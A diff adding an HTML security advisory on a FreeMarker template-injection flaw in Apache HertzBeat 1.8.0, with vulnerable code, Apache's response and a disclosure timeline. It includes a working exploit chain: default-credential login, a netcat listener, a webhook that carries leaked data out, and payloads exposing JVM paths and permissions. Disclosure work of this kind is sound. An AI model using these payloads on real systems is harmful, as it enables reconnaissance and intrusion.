@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apache HertzBeat (v1.8.0) FreeMarker SSTI — Info Disclosure</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2rem;
+      color: #333;
+    }
+    h1 { font-size: 1.75rem; margin-top: 0; border-bottom: 2px solid #333; padding-bottom: 0.5rem; }
+    h2 { font-size: 1.35rem; margin-top: 2rem; }
+    h3 { font-size: 1.15rem; margin-top: 1.5rem; }
+    pre, code {
+      font-family: 'SF Mono', Monaco, 'Consolas', 'Liberation Mono', monospace;
+      font-size: 0.9rem;
+    }
+    pre {
+      background: #f5f5f5;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 1rem;
+      overflow-x: auto;
+      white-space: pre;
+      margin: 1rem 0;
+    }
+    code { padding: 0.2em 0.4em; background: #f0f0f0; border-radius: 3px; }
+    pre code { padding: 0; background: none; }
+    a { color: #0066cc; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    hr { margin: 2rem 0; border: none; border-top: 1px solid #ccc; }
+    ul { margin: 0.5rem 0; padding-left: 1.5rem; }
+  </style>
+</head>
+<body>
+
+<h1>Apache HertzBeat (v1.8.0) FreeMarker SSTI — Info Disclosure</h1>
+
+<p><strong>Severity:</strong> HIGH (info disclosure; RCE/file I/O blocked)<br>
+<strong>Product:</strong> <a href="https://hertzbeat.apache.org/">https://hertzbeat.apache.org/</a> (v1.8.0)<br>
+<strong>Component:</strong> <code>AbstractAlertNotifyHandlerImpl.renderContent()</code> (hertzbeat-alerter)<br>
+<strong>FreeMarker:</strong> 2.3.34 (compatibility 2.3.0)<br>
+<strong>Auth Required:</strong> <code>admin</code> or <code>user</code> role</p>
+
+<p><strong>Author:</strong> Brett Gervasoni<br>
+<strong>Date:</strong> 2026-03-09</p>
+
+<hr>
+
+<h2>Vulnerability Summary</h2>
+
+<p><code>renderContent()</code> processes user-controlled FreeMarker templates without adequate sandboxing. Authenticated users create custom notification templates via <code>POST /api/notice/template</code>. When an alert fires, FreeMarker renders the template server-side, exposing:</p>
+<ul>
+  <li>Template data model keys, internal Java class names, and method/field enumeration</li>
+  <li><strong>ProtectionDomain leak</strong> — filesystem paths, classloader identity, and all JVM security permissions</li>
+</ul>
+
+<p><code>SAFER_RESOLVER</code> and <code>EXPOSE_SAFE</code> block RCE and file I/O, but property traversal on full JPA entities still yields extensive info disclosure.</p>
+
+<hr>
+
+<h2>Vulnerable Code</h2>
+
+<p><strong><code>AbstractAlertNotifyHandlerImpl.java</code> lines 55–77:</strong></p>
+
+<pre><code>protected String renderContent(NoticeTemplate noticeTemplate, GroupAlert alert)
+        throws TemplateException, IOException {
+    StringTemplateLoader stringLoader = new StringTemplateLoader();
+    Configuration cfg = new Configuration(Configuration.VERSION_2_3_0);   // Legacy permissive
+    cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
+    Map&lt;String, Object&gt; model = new HashMap&lt;&gt;(16);
+    model.put("alerts", alert.getAlerts());     // Full JPA entities with .class, .protectionDomain
+    model.put("groupLabels", alert.getGroupLabels());
+    model.put("commonLabels", alert.getCommonLabels());
+    model.put("commonAnnotations", alert.getCommonAnnotations());
+    // ...
+    stringLoader.putTemplate(templateName, noticeTemplate.getContent()); // User-controlled
+    cfg.setTemplateLoader(stringLoader);
+    templateRes = cfg.getTemplate(templateName, Locale.CHINESE);
+    return FreeMarkerTemplateUtils.processTemplateIntoString(templateRes, model);
+}</code></pre>
+
+<hr>
+
+<h2>Exploitation</h2>
+
+<p><strong>Chain:</strong> Authenticate → Create malicious template → Create webhook receiver → Create notification rule → Trigger alert → Rendered output (with leaked data) is sent to your webhook.</p>
+
+<h3>Step 1 — Authenticate</h3>
+
+<pre><code>POST /api/account/auth/form HTTP/1.1
+Host: TARGET:1157
+Content-Type: application/json
+
+{"type":0,"identifier":"admin","credential":"hertzbeat"}</code></pre>
+
+<p>Use the JWT from <code>data.token</code> as <code>Authorization: Bearer &lt;token&gt;</code> in all subsequent requests.</p>
+
+<h3>Step 2 — Create malicious template</h3>
+
+<p>The <code>content</code> field is a FreeMarker template. Use <code>type: 2</code> (webhook).</p>
+
+<h3>Step 3 — Create webhook receiver and notification rule</h3>
+
+<p>Start netcat, then create receiver and rule (replace IDs from GET responses):</p>
+
+<pre><code># netcat (attacker machine)
+while true; do printf 'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK' | nc -l 9999; done</code></pre>
+
+<pre><code>POST /api/notice/receiver
+{"name":"ssti-receiver","type":2,"hookUrl":"http://host.docker.internal:9999/webhook"}
+
+POST /api/notice/rule  (use IDs from GET /api/notice/receivers and GET /api/notice/templates)
+{"name":"ssti-rule","receiverId":[7],"receiverName":["ssti-receiver"],"templateId":7,"templateName":"ssti-template","enable":true,"filterAll":true}</code></pre>
+
+<h3>Step 4 — Trigger alert</h3>
+
+<pre><code>POST /api/alerts/report HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer &lt;token&gt;
+Content-Type: application/json
+
+{"labels":{"alertname":"SSTIProof123","instance":"test","severity":"critical"},"annotations":{"summary":"SSTI PoC"},"content":"Trigger","status":"firing","startAt":1234567890000,"activeAt":1234567890000,"triggerTimes":1}</code></pre>
+
+<p>Within seconds, the webhook receives the rendered template with leaked data.</p>
+
+<hr>
+
+<h2>Most Critical Payload — ProtectionDomain Leak</h2>
+
+<p>This payload leaks filesystem paths, classloader identity, and all JVM security permissions.</p>
+
+<p><strong>Template <code>content</code> (create via <code>POST /api/notice/template</code>):</strong></p>
+
+<pre><code>{"protection_domain": "&lt;#attempt&gt;${alerts[0].class.protectionDomain}&lt;#recover&gt;blocked&lt;/#attempt&gt;"}</code></pre>
+
+<p><strong>Full POST request:</strong></p>
+
+<pre><code>POST /api/notice/template HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer &lt;token&gt;
+Content-Type: application/json
+
+{"name":"ssti-template","type":2,"preset":false,"content":"{\"protection_domain\": \"&lt;#attempt&gt;${alerts[0].class.protectionDomain}&lt;#recover&gt;blocked&lt;/#attempt&gt;\"}"}</code></pre>
+
+<p><strong>Excerpt of captured output:</strong></p>
+
+<pre><code>{"protection_domain": "ProtectionDomain  (file:/opt/hertzbeat/lib/hertzbeat-common-2.0-SNAPSHOT.jar &lt;no signer certificates&gt;)
+ jdk.internal.loader.ClassLoaders$AppClassLoader@764c12b6
+ &lt;no principals&gt;
+ java.security.Permissions@4cf7242f (
+  ("java.io.FilePermission" "/opt/hertzbeat/lib/hertzbeat-common-2.0-SNAPSHOT.jar" "read")
+  ("java.net.SocketPermission" "localhost:0" "listen,resolve")
+  ("java.util.PropertyPermission" "os.name" "read")
+  ("java.util.PropertyPermission" "os.arch" "read")
+  ...
+ )
+"}</code></pre>
+
+<p><strong>Impact:</strong> Filesystem paths, classloader address, OS properties, and full permission set — usable to fingerprint the deployment and plan further attacks.</p>
+
+<hr>
+
+<h2>Other Useful Payloads</h2>
+
+<p><strong>Data model keys:</strong></p>
+<pre><code>{"keys": "${.data_model?keys?join('|')}"}</code></pre>
+<p>→ <code>commonLabels|alerts|groupLabels|consoleUrl|title|commonAnnotations|status</code></p>
+
+<p><strong>Java class name:</strong></p>
+<pre><code>{"class": "&lt;#if alerts?? &amp;&amp; (alerts?size &gt; 0)&gt;${alerts[0].class.name}&lt;/#if&gt;"}</code></pre>
+<p>→ <code>org.apache.hertzbeat.common.entity.alerter.SingleAlert</code></p>
+
+<p><strong>Entity fields and types:</strong></p>
+<pre><code>{"fields": "&lt;#attempt&gt;&lt;#list alerts[0].class.declaredFields as f&gt;${f.name}:${f.type.name},&lt;/#list&gt;&lt;#recover&gt;blocked&lt;/#attempt&gt;"}</code></pre>
+<p>→ <code>id:java.lang.Long,fingerprint:java.lang.String,labels:java.util.Map,...</code></p>
+
+<hr>
+
+<h2 id="response-from-apache">Response from Apache</h2>
+
+<p>Official response from Apache Security Team:</p>
+
+<blockquote>As documented in HertzBeat's security model at <a href="https://hertzbeat.apache.org/docs/help/security_model/">https://hertzbeat.apache.org/docs/help/security_model</a>, this is expected, intended functionality: it is up to the operator to make sure only trusted users are given access to HertzBeat. Customization is a feature, and users are responsible for their own custom templates. It's expected that any authenticated user is trusted with admin capabilities.</blockquote>
+
+<p>The permission model in HertzBeat has not been finished yet, though the product has shipped. See the <a href="https://hertzbeat.apache.org/docs/help/security_model/">HertzBeat Security Model</a> documentation for details.</p>
+
+<p>This is what Apache had to say about role-based permissions:</p>
+
+<blockquote>Please note that the role permission function is being improved, please do not use roles to control user permissions, all users have management permissions</blockquote>
+
+<h3>Reporting Timeline</h3>
+
+<ul>
+  <li><strong>Feb 19, 2026:</strong> Reported to Apache Security</li>
+  <li><strong>Feb 19 – March 4:</strong> Deliberations on whether or not to classify any security vulnerabilities post auth as a vulnerability.</li>
+  <li><strong>March 4:</strong> Discussion concluded. Apache does not consider post auth vulnerabilities in HertzBeat to be a vulnerability, and rather the user must accept this risk.</li>
+  <li><strong>March 9:</strong> Public release.</li>
+</ul>
+
+</body>
+</html>
